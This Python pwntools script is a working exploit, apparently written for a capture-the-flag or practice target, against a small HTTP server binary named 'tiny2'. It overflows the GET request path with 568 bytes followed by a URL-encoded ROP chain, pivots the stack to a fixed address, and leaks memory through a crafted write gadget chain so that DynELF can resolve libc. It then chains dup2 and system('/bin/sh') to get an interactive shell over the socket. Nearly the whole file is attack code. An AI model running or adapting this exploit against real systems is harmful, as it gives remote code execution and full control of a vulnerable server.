#!/usr/bin/env python

import time, urllib
from pwn import *

context(arch='amd64', word_size=64, os='linux')

elf = ELF('./tiny2')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
#libc = ELF('./puppa-libc')
rop = ROP(elf)
ADDR = '127.0.0.1'
#ADDR = '10.10.10.89'
PORT = 1111

'''
0x0000000000401fd0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x00000000004011d8 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401787 : pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004011dc : pop r15 ; ret
'''

elf.checksec()

def p64u(x):
	return urllib.quote_plus(struct.pack('<Q', x))

# rop =  p64u(0x4011dd)			# pop rdi ; ret
# rop += p64u(0x4)				# sockfd
# rop += p64u(0x4011db)			# pop rsi ; pop r15 ; ret
# rop += p64u(0x603270)			# rwx addr
# rop += p64u(0xffffffffffffffff)	# garbage for r15
# rop += p64u(0x400cf0)			# <read@plt>
# rop += p64u(0x40178a)			# pop rsp ; ret
# rop += p64u(0x603270)			# rwx addr

bss = elf.symbols['__bss_start']
pivot = 0x603270
pivot2 = 0x603a70
rop.read(0x4, pivot)
rop.migrate(pivot)
print rop.dump()
'''
#GENERATED VIA PWNTOOLS
0x0000:         0x103f47 syscall; pop rdx; pop rsi; ret
0x0008: 0xffffffffffffffff [arg2] rdx = 18446744073709551615
0x0010:         0x603270 [arg1] rsi = 6304368
0x0018:          0x2144f pop rdi; ret
0x0020:              0x4 [arg0] rdi = 4
0x0028:          0xe8050 read
0x0030:           0x3960 pop rsp; ret
0x0038:         0x603270
'''

r = remote(ADDR, PORT)
r.send('GET ' + 'A'*568 + urllib.quote_plus(rop.chain()) + '\n\n')
r.recvuntil('File not found')

@MemLeak
def leak(addr):
	rop = ROP(elf)

	'''
	rop.write(4, addr, context.bytes)
	rop.read(4, pivot3, 0xf0)
	rop.migrate(pivot3)
	'''

	rop.raw(0x4011d8)			# pop r13 ; pop r14 ; pop r15 ; ret
	rop.raw(context.bytes)		# reads only bytes needed
	rop.raw(addr)
	rop.raw(0x4)				# sockfd
	rop.raw(0x401787)			# pop rbx ; pop rbp ; pop r12 ; ret
	rop.raw(0x0)				# zeroes rbx
	rop.raw(0x4011dc)			# pop r15 ; ret
	rop.raw(0x6032a0)			# pointer to previous gadget
	rop.raw(0x401fd0)			# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
	rop.write()
	rop.raw(0x4011d8)			# pop r13 ; pop r14 ; pop r15 ; ret
	rop.raw(0xb1)				# space for new rop chain
	rop.raw(pivot)
	rop.raw(0x4)				# sockfd
	rop.raw(0x401787)			# pop rbx ; pop rbp ; pop r12 ; ret
	rop.raw(0x0)				# zeroes rbx
	rop.raw(0x4011dc)			# pop r15 ; ret
	rop.raw(0x6032a0)			# pointer to previous gadget
	rop.raw(0x401fd0)			# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
	rop.read()

	rop.migrate(pivot)

	#print rop.dump()
	r.send(rop.chain() + '\n')

	data = r.recv(10000)
	#print "Leaked %#x\n%s" % (addr, hexdump(data))

	return data

def exploit(de):
	#libc = de.libc
	libc.address = de.lookup(None, 'libc')

	rop2 = ROP(libc)
	rop2.dup2(4, 0)
	rop2.dup2(4, 1)
	rop2.dup2(4, 2)
	rop2.system(libc.search('/bin/sh').next())
	rop2.exit()

	#print rop2.dump()
	r.send(rop2.chain())
	
	r.interactive()
	r.close()

de = DynELF(leak, None, elf, True)

exploit(de)
